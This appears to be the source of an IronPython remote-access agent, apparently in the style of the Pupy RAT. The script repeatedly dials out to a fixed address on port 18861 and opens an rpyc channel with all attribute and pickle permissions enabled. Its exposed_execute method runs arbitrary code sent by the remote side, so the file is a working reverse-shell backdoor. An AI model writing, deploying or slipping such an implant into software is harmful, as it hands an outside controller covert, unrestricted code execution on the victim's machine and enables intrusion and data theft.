# -*- coding: utf-8 -*-

from __future__ import unicode_literals, print_function
import clr
import locale
import rpyc
import sys
import json
import logging
import zlib
#import threading
#from Queue import Queue
from rpyc.core.channel import Channel
from rpyc.core.stream import SocketStream
from rpyc.core.service import Service

clr.AddReference('IronPython')

from IronPython.Hosting import Python


logging.basicConfig(format="%(asctime)s [%(levelname)s] - %(filename)s: %(funcName)s - %(message)s", level=logging.DEBUG)

infos = {}
#queue = Queue(maxsize=1)

REVERSE_SLAVE_CONF = dict(
    allow_all_attrs=True,
    allow_public_attrs=True,
    allow_pickle=True,
    allow_getattr=True,
    allow_setattr=True,
    allow_delattr=True,
    import_custom_exceptions=False,
    propagate_SystemExit_locally=True,
    propagate_KeyboardInterrupt_locally=True,
    instantiate_custom_exceptions=True,
    instantiate_oldstyle_exceptions=True,
)


def safe_obtain(proxy):
    """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """
    if type(proxy) in [list, str, bytes, dict, set, type(None)]:
        return proxy
    conn = object.__getattribute__(proxy, "____conn__")()
    return json.loads(
        zlib.decompress(
            conn.root.json_dumps(proxy, compressed=True)
        )
    ) # should prevent any code execution


def obtain(proxy):
    """ allows to convert netref types into python native types """
    return safe_obtain(proxy)


class STChannel(Channel):
    COMPRESSION_LEVEL = 6


class ReverseSlaveService(Service):

    __slots__ = ["exposed_cleanups"]

    def on_connect(self):
        self.exposed_cleanups = []
        self._conn._config.update(REVERSE_SLAVE_CONF)

        #global infos
        #if not infos:
        #    infos = get_uuid()

    def on_disconnect(self):
        for cleanup in self.exposed_cleanups:
            try:
                cleanup()
            except Exception as e:
                print('[D]')

        self.exposed_cleanups = []

        try:
            self._conn.close()
        except Exception as e:
            print("Error closing connection:", str(e))

    def exposed_exit(self):
        try:
            return True
        finally:
            sys.exit(0)

    def exposed_get_infos(self, s=None):
        global infos

        if not s:
            return {
                k: v for k, v in infos.iteritems()
            }

        if s not in infos:
            return None

        return infos[s]

    def exposed_register_cleanup(self, method):
        self.exposed_cleanups.append(method)

    def exposed_unregister_cleanup(self, method):
        self.exposed_cleanups.remove(method)

    def exposed_execute(self, text):
        engine = Python.CreateEngine()

        hosted_sys = Python.GetSysModule(engine)
        hosted_sys.path = sys.path
        hosted_sys.meta_path = sys.meta_path

        result = engine.Execute(text)
        return result

    def exposed_json_dumps(self, obj, compressed=False):
        try:
            data = json.dumps(obj, ensure_ascii=False)
        except:
            try:
                data = json.dumps(
                    obj,
                    ensure_ascii=False,
                    encoding=locale.getpreferredencoding()
                )
            except:
                data = json.dumps(
                    obj,
                    ensure_ascii=False,
                    encoding='latin1'
                )

        if compressed:
            if type(data) == unicode:
                data = data.encode('utf-8')

            data = zlib.compress(data)

        return data

    def exposed_getconn(self):
        """returns the local connection instance to the other side"""
        return self._conn


while True:
    try:
        s = SocketStream.connect("172.16.164.1", 18861, ipv6=False, keepalive=True)
        conn = rpyc.connect_channel(STChannel(s), service=ReverseSlaveService)
        break
    except Exception as e:
        logging.error('Error connnecting to server: {}'.format(e))

bgsrv = rpyc.BgServingThread(conn)
bgsrv._thread.join()
